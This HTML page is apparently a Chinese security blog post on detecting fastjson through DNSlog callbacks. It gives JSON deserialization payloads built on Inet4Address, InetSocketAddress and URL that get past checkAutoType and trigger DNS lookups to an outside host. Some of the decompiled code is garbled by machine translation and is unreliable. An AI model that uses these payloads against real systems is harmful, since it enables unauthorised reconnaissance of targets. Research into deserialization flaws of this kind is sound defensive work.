<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="通过Dnslog判断是否使用fastjson方法一：利用java.net.Inet [4 | 6]地址很早之前有一个方法是使用java.net.InetAddress类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（v1.2.67）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以java.net.Inet4Address为例分析">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Fastjson/%E9%80%9A%E8%BF%87Dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="通过Dnslog判断是否使用fastjson方法一：利用java.net.Inet [4 | 6]地址很早之前有一个方法是使用java.net.InetAddress类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（v1.2.67）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以java.net.Inet4Address为例分析">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:56.509Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Fastjson/通过Dnslog判断是否使用fastjson" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Fastjson/%E9%80%9A%E8%BF%87Dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson/" class="article-date">
  <time datetime="2022-07-08T06:25:56.509Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="通过Dnslog判断是否使用fastjson"><a href="#通过Dnslog判断是否使用fastjson" class="headerlink" title="通过Dnslog判断是否使用fastjson"></a>通过Dnslog判断是否使用fastjson</h1><h2 id="方法一：利用java-net-Inet-4-6-地址"><a href="#方法一：利用java-net-Inet-4-6-地址" class="headerlink" title="方法一：利用java.net.Inet [4 | 6]地址"></a>方法一：利用java.net.Inet [4 | 6]地址</h2><p>很早之前有一个方法是使用<code>java.net.InetAddress</code>类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（<code>v1.2.67</code>）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以<code>java.net.Inet4Address</code>为例分析构造原理。</p>
<pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
</code></pre>
<p>我们知道在fastjson在反序列化之前都会调用<code>checkAutoType</code>方法对类进行检查。通过调试发现，由于<code>java.net.Inet4Address</code>不在黑名单中，所以就算开启AutoType也是能过<code>1</code>处的检查。</p>
<p>fastjson的ParserConfig类自己维护了一个<code>IdentityHashMap</code>，在这个HashMap中的类会被认为是安全的。在<code>2</code>处可以在IdentityHashMap中可以获取到<code>java.net.Inet4Address</code>，所以<code>clazz</code>不为<code>null</code>，导致在<code>3</code>处就返回了。跳过了后续的未开启<code>AutoType</code>的黑名单检查。所以可以发现无论<code>AutoType</code>是否开启，都可以过<code>checkAutoType</code>的检查</p>
<pre><code>//com.alibaba.fastjson.parser.ParserConfig#checkAutoType
public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
    ...
    Class clazz;

    // 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查
    if (!internalWhite &amp;&amp; (this.autoTypeSupport || expectClassFlag)) &#123;
        hash = h3;

        for(mask = 3; mask &lt; className.length(); ++mask) &#123;
            hash ^= (long)className.charAt(mask);
            hash *= 1099511628211L;
            ....
            if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null &amp;&amp; Arrays.binarySearch(this.acceptHashCodes, fullHash) &lt; 0) &#123;
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            &#125;
        &#125;
    &#125;


    clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) &#123;
        // 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。
        clazz = this.deserializers.findClass(typeName);
    &#125;

    if (clazz == null) &#123;
        clazz = (Class)this.typeMapping.get(typeName);
    &#125;

    if (internalWhite) &#123;
        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
    &#125;

    if (clazz != null) &#123;
        if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
        &#125; else &#123;
            // 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查
            return clazz;
        &#125;
    &#125; else &#123;
        // 4. 不开启autoType时，进行的黑名单检查
        if (!this.autoTypeSupport) &#123;
            hash = h3;

            for(mask = 3; mask &lt; className.length(); ++mask) &#123;
                char c = className.charAt(mask);
                hash ^= (long)c;
                hash *= 1099511628211L;
                if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0) &#123;
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                &#125;
                ...
            &#125;
        &#125;
    &#125;    
    ...
&#125;
</code></pre>
<p>fastjason对于<code>Inet4Address</code>类会使用<code>MiscCodec</code>这个<code>ObjectDeserializer</code>来反序列化。跟进发现解析器会取回val变量的值赋值给strVal变量，由于我们的类是Inet4Address，所以它们会执行到1处，进行域名解析。</p>
<pre><code>//com.alibaba.fastjson.serializer.MiscCodec#deserialze 
public &lt;T&gt; T deserialze（DefaultJSONParser parser，Type clazz，Object fieldName）&#123; 
        ... 
        objVal = parser.parse（）; 
         ... 
        strVal =（String）objVal; 
        if（strVal！= null &amp;&amp; strVal.length（）！= 0）&#123; 
            if（clazz == UUID.class）&#123; 
                ... 
            &#125; else if（clazz == URI.class）&#123; 
                ... 
            &#125; else if（clazz == URL.class）&#123; 
                ... 
            &#125; else if（clazz == Pattern.class）&#123; 
                ... 
            &#125; else if（clazz == Locale.class）&#123; 
                ...
            &#125; else if（clazz == SimpleDateFormat.class）&#123; 
                ... 
            &#125; else if（clazz！= InetAddress.class &amp;&amp; clazz！= Inet4Address.class &amp;&amp; clazz！= Inet6Address.class）&#123; 
                ... 
            &#125; else &#123; 
                试试&#123; 
                    / / 1.将strVal作为主机名，获取其对应的IP，域名在此处被解析
                    返回InetAddress.getByName（strVal）; 
                &#125; catch（UnknownHostException var11）&#123; 
                    抛出新的JSONException（“反序列化inet地址错误”，var11）; 
                &#125; 
            &#125; 
        &#125;其他&#123; 
            返回null; 
        &#125; 
&#125;
</code></pre>
<h2 id="方法二：利用java-net-InetSocketAddress"><a href="#方法二：利用java-net-InetSocketAddress" class="headerlink" title="方法二：利用java.net.InetSocketAddress"></a>方法二：利用java.net.InetSocketAddress</h2><p><code>java.net.InetSocketAddress</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p>
<p>通过它要走到<code>InetAddress.getByName()</code>流程计量方法一是要绕过一些路的。刚开始一直没构造出来，后来在和实验室的<code>@背影</code>师傅交流时，才知道可以顺着解析器规则构造（<code>它要啥就给它啥</code>），最终有效载荷如下，当然它是畸形的json。</p>
<pre><code>&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;
</code></pre>
<p>那这个是怎样构造出来的呢？这需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器<code>token</code>值对应的含义，可以在<code>com.alibaba.fastjson.parser.JSONToken</code>类中看到它们。</p>
<pre><code>//com.alibaba.fastjson.parser.JSONToken
public class JSONToken &#123;
    ...
    public static String name(int value) &#123;
        switch(value) &#123;
        case 1:
            return &quot;error&quot;;
        case 2:
            return &quot;int&quot;;
        case 3:
            return &quot;float&quot;;
        case 4:
            return &quot;string&quot;;
        case 5:
            return &quot;iso8601&quot;;
        case 6:
            return &quot;true&quot;;
        case 7:
            return &quot;false&quot;;
        case 8:
            return &quot;null&quot;;
        case 9:
            return &quot;new&quot;;
        case 10:
            return &quot;(&quot;;
        case 11:
            return &quot;)&quot;;
        case 12:
            return &quot;&#123;&quot;;
        case 13:
            return &quot;&#125;&quot;;
        case 14:
            return &quot;[&quot;;
        case 15:
            return &quot;]&quot;;
        case 16:
            return &quot;,&quot;;
        case 17:
            return &quot;:&quot;;
        case 18:
            return &quot;ident&quot;;
        case 19:
            return &quot;fieldName&quot;;
        case 20:
            return &quot;EOF&quot;;
        case 21:
            return &quot;Set&quot;;
        case 22:
            return &quot;TreeSet&quot;;
        case 23:
            return &quot;undefined&quot;;
        case 24:
            return &quot;;&quot;;
        case 25:
            return &quot;.&quot;;
        case 26:
            return &quot;hex&quot;;
        default:
            return &quot;Unknown&quot;;
        &#125;
    &#125;
&#125;
</code></pre>
<p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是<code>&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:</code></p>
<pre><code>//com.alibaba.fastjson.serializer.MiscCodec#deserialze
public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) &#123;
        JSONLexer lexer = parser.lexer;
        String className;
        if (clazz == InetSocketAddress.class) &#123;
            if (lexer.token() == 8) &#123;
                lexer.nextToken();
                return null;
            &#125; else &#123;
                // 12 ---&gt; &#123;
                parser.accept(12);
                InetAddress address = null;
                int port = 0;

                while(true) &#123;
                    className = lexer.stringVal();
                    
                    lexer.nextToken(17);
                    // 字段名需要为address
                    if (className.equals(&quot;address&quot;)) &#123;
                        // 17 ---&gt; :
                        parser.accept(17);
                        // 1. 我们需要让解析器走到这里
                        address = (InetAddress)parser.parseObject(InetAddress.class);
                    &#125; 
                    ...
                &#125;
            &#125;
        &#125; 
        ...
&#125;
</code></pre>
<p><code>parser.parseObject(InetAddress.class)</code>最终依然会，调用<code>MiscCodec#deserialze()</code>方法来序列化，这里就来到了我们构造payload的第二步。第二步的目标是要让解析器走到<code>InetAddress.getByName(strVal)</code>。解析器要接受的字符在代码里标好了，并按顺序写就是<code>,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</code>。</p>
<pre><code>//com.alibaba.fastjson.serializer.MiscCodec#deserialze
public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) &#123;
        JSONLexer lexer = parser.lexer;
        String className;
        // 序列化的是InetAddress.class类，走else流程
        if (clazz == InetSocketAddress.class) &#123;
            ...
        &#125; else &#123;
            Object objVal;
            if (parser.resolveStatus == 2) &#123;
                parser.resolveStatus = 0;
                // 16 ---&gt; ,
                parser.accept(16);
                if (lexer.token() != 4) &#123;
                    throw new JSONException(&quot;syntax error&quot;);
                &#125;
                // 字段名 ---&gt; val
                if (!&quot;val&quot;.equals(lexer.stringVal())) &#123;
                    throw new JSONException(&quot;syntax error&quot;);
                &#125;

                lexer.nextToken();
                // 17 ---&gt; :
                parser.accept(17);
                // 之后解析为对象,也就是val字段对应的值
                objVal = parser.parse();
                // 13 ---&gt; &#125;
                parser.accept(13);
            &#125; 
            ....
           // 后续的流程和方法一一样了，进行类型判断
           strVal = (String)objVal;
           if (strVal != null &amp;&amp; strVal.length() != 0) &#123;
            if (clazz == UUID.class) &#123;
                ...
            &#125; else if (clazz == URI.class) &#123;
                ...
            &#125; else if (clazz == URL.class) &#123;
                ...
            &#125; else if (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;
                ...
            &#125; else &#123;
                try &#123;
                // 域名解析
                    return InetAddress.getByName(strVal);
                &#125; catch (UnknownHostException var11) &#123;
                    throw new JSONException(&quot;deserialize inet adress error&quot;, var11);
                &#125;
            &#125;
        &#125; 
&#125;
</code></pre>
<p>两段合起来就得到了最终的有效载荷。</p>
<h2 id="方法三：利用java-net-URL"><a href="#方法三：利用java-net-URL" class="headerlink" title="方法三：利用java.net.URL"></a>方法三：利用java.net.URL</h2><p><code>java.net.URL</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p>
<pre><code>&#123;&#123;“ @type”：“ java.net.URL”，“ val”：“ http：// dnslog”&#125;：“ x”&#125;

来源于`@retanoj`状语从句：`@threedr3am`两位师傅的启发，其原理和ysoserial的中`URLDNS`这个小工具的原理一样。

**简单来说就是向HashMap压入一个键值对时，HashMap需要获取键对象的哈希码。当键对象是一个URL对象时，在获取它的**`hashcode`**期间会调用**`getHostAddress`**方法获取主机，这个过程域名会被解析。**

2 1.png

URL对象hashcode的获取过程

fastjson解析上述payload时，先反序列化出`URL(http://dnslog)`对象，然后将`&#123;URL(http://dnslog):"x"&#125;`解析为一个HashMap，域名被解析。

`@retanoj`在[问题](https://github.com/alibaba/fastjson/issues/3077)中还构造了好几个畸形的有效载荷，虽然原理都是一样的，但还是挺有意思的，意识到了师傅对fastjson词法分析器透彻的理解。

    &#123;"@type":"com.alibaba.fastjson.JSONObject", &#123;"@type": "java.net.URL", "val":"http://dnslog"&#125;&#125;&quot;&quot;&#125;
Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]
Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;
&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;:0
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.adminxe.com/1037.html">https://www.adminxe.com/1037.html</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Fastjson/%E9%80%9A%E8%BF%87Dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson/" data-id="cl5c2qp4j007ay8v19sqq1qjn" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/FCKeditor/%E4%B8%80%E3%80%81%E6%9F%A5%E7%9C%8BFCKeditor%E7%89%88%E6%9C%AC/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Fastjson/Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>